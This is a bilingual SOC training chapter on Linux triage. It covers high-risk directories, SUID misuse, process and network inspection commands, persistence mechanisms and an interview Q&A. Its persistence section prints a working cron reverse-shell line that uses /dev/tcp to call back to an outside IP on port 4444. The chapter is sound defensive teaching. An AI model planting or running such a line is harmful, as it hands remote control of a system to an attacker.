# Day 09 — Linux Operating System Architecture, Security Fundamentals & Command-Line Triage for SOC Analysts

> **What you'll learn / Is chapter mein:** Navigate Linux security-relevant paths, processes, permissions and command-line triage.
>
> **Seedhi baat:** Linux mein command chalana aana useful hai, lekin output ka source, user, timestamp aur meaning document karna equally important hai.

**Course focus:** Linux Attack Surface, Process Inspection, SUID Misconfigurations & Persistence Hunting

> **Study note:** Core content is based on the supplied text notes. Formatting and explanatory context have been edited for readability. Commands, thresholds and detection examples are illustrative; validate them in an authorized lab and against your own data schema before operational use.

---

## 1. Linux Filesystem Architecture (SOC Investigation View)

Linux mein *“Everything is a file”* philosophy chalti hai. File hierarchy standard (FHS) ko samajhna threat hunting ke liye critical hai, kyunki attackers Linux servers ko compromise karte waqt specific directories ko staging grounds ke roop mein use karte hain.

```
/ (Root Directory)
├── bin / sbin       (Essential System & Admin Binaries)
├── etc              (System Configurations, Credentials: /etc/passwd, /etc/shadow)
├── home / root      (User Profiles & Bash Histories: ~/.bash_history)
├── var              (Variable Data: /var/log/ auth logs, /var/spool/cron/ crontabs)
├── tmp & /dev/shm   (World-Writable Staging Grounds - High Threat Risk)
└── proc             (Virtual Filesystem: Running processes in memory /proc/[PID]/)

```

### Critical High-Risk Directories for SOC Analysts

* **`/tmp` & `/var/tmp`:**
* **English:** World-writable directories (`rwxrwxrwx` permissions) where any standard user or service account can read and write files.
* **Hinglish:** Attackers web applications (Apache/Nginx) ko exploit karke unke low-privilege service account (`www-data`) ke through yahan malicious scripts, exploit payloads aur cryptominers drop karte hain kyunki yahan write permissions open hoti hain.

* **`/dev/shm` (Shared Memory):**
* **English:** A temporary filesystem stored entirely in volatile RAM (tmpfs).
* **Hinglish:** Ye RAM par chalta hai, disk par nahi. Attacker agar malware yahan execute karta hai, toh disk-based file scanners use detect nahi kar pate, aur system reboot hote hi evidence volatile memory se gayab ho jata hai.

* **`/proc` (Process Virtual Filesystem):**
* Har running process ka ek numeric directory hota hai (e.g., `/proc/1432/`). Agar attacker disk se malicious binary delete bhi kar deta hai (`rm -rf malware`), tab bhi running binary ka live executable link `/proc/[PID]/exe` par memory mein tab tak available rehta hai jab tak process kill na ho.

---

## 2. Linux Permissions Model & Privilege Escalation Vectors

### Standard Permissions (Read, Write, Execute)

```
- rwx r-x r--   1  root  admin  4096  Oct 9 10:00  malicious_script.sh
  │   │   │
  │   │   └── Others (Read Only: 4)
  │   └────── Group (Read + Execute: 5)
  └────────── Owner / User (Read + Write + Execute: 7)

```

### Dangerous Permission Bits: SUID & SGID

* **SUID (Set User ID - Value 4000):** Jab kisi binary par SUID bit set hoti hai (`-rwsr-xr-x`), toh koi bhi normal user jab us binary ko run karega, wo binary uske real user ke rights se nahi, balki **file owner (usually Root)** ke rights se execute hogi.
* **Legitimate Example:** `/usr/bin/passwd` par SUID root hota hai kyunki normal user ko apna password change karte waqt root-owned file `/etc/shadow` ko modify karna padta hai.
* **Attacker Abuse:** Agar administrator galti se text editors (`vim`, `nano`), file readers (`cat`, `less`), ya scripting engines (`python`, `bash`) par SUID bit chhod deta hai, toh attacker normal user hote hue bhi single command se full Root shell hasil kar leta hai (GTFOBins techniques).

```bash
# SOC Triage Command: Hunting for SUID binaries with Root ownership
find / -perm -u=s -type f 2>/dev/null

```

---

## 3. Real-Time Linux Threat Triage: Essential CLI Toolkit

Jab ek SOC analyst kisi suspicious Linux endpoint par Live Response session open karta hai, toh in commands ke through active compromise inspect kiya jata hai:

### A. Process Inspection (Detecting Malicious Binaries)

* **`ps aux --sort=-%cpu`:** High CPU-consuming processes dekhna (Cryptominers triage).
* **`pstree -p`:** Process hierarchy visually dekhna.
* *Red Flag:* Agar web server process (`apache2` ya `nginx`) background mein `/bin/bash` ya `/bin/sh` spawn kar rahi hai, toh ye 100% **Web Shell / Reverse Shell** ka indicator hai.

* **`lsof -p <PID>`:** Dekhna ki specific process ne disk par kaunsi files open kar rakhi hain.

### B. Network Connection Triage (Detecting C2 & Reverse Shells)

* **`ss -tulpn` / `netstat -antp`:** Dekhna ki kaunse ports listening state mein hain aur kaunse outbound ESTABLISHED connections chal rahe hain.
* *Investigation focus:* Check the PID and Process Name tied to external outbound connections on high dynamic ports.

* **`lsof -i :<PORT>`:** Dekhna ki specific port par kaunsi process communicate kar rahi hai.

### C. User Account & Identity Auditing

* **`cat /etc/passwd | grep -E ":0:"`:** Check karna ki Root ke alawa kis user ka UID 0 hai (Backdoor root accounts).
* **`who` / `w` / `last`:** Active logged-in users aur unke source IP addresses verify karna.

---

## 4. Linux Persistence Mechanisms

Compromise hone ke baad attacker reboot ke baad access banaye rakhne ke liye persistence setup karta hai:

```
[ Persistence Vectors in Linux ]
├── 1. Cron Jobs (/etc/crontab, /var/spool/cron/crontabs/)
├── 2. Systemd Malicious Services (/etc/systemd/system/backdoor.service)
├── 3. Shell Profile Injections (~/.bashrc, ~/.bash_profile, /etc/profile)
└── 4. SSH Authorized Keys Injection (~/.ssh/authorized_keys)

```

1. **Cron Jobs:** Scheduled tasks jo regular intervals par automatically execute hoti hain. Attacker har 15 minute mein reverse shell reconnect karne ke liye cron entry add karta hai:
```cron
*/15 * * * * /bin/bash -c 'bash -i >& /dev/tcp/185.220.101.5/4444 0>&1'

```

2. **Systemd Services:** Modern Linux systems mein attacker ek hidden `.service` file create karke `systemctl enable` kar deta hai, jisse system boot hote hi uska payload automatically as a background daemon chal jata hai.
3. **SSH Key Backdoors:** Attacker apni public key target user ke `~/.ssh/authorized_keys` file mein append kar deta hai, jisse wo future mein bina password ke direct SSH login kar sakta hai.

---

## 5. High-Yield Interview Q&A (Day 9 Focus)

**Q1: During Linux triage, you find that an Apache process (`www-data`) has spawned `/bin/sh` which is connected to an external IP on port 4444. What attack does this indicate, and what are your immediate actions?**

* **Answer:**
* **Attack Indication:** This indicates a Remote Code Execution (RCE) vulnerability in a hosted web application that was exploited to spawn an interactive **Reverse Shell / Web Shell** back to the attacker's listener on port 4444.
* **Immediate Actions:**
1. Immediately kill the malicious shell process (`kill -9 <PID>`).
2. Block the destination IP address on the enterprise firewall.
3. Isolate the Linux host from the network.
4. Inspect `/proc/<PID>/cwd` to identify the web directory where the exploit was dropped.
5. Review web server access logs around that timestamp to find the specific vulnerable URI/parameter and attacker's source IP.

---

---

---

## Analyst takeaway / Yaad rakhne wali baat

Command output context ke bina incomplete hai; authorization aur change-impact ka dhyan rakho.

## Practice prompt / Khud try karo

Linux auth log ke synthetic entries se failed logons aur successful follow-up ki timeline banao.
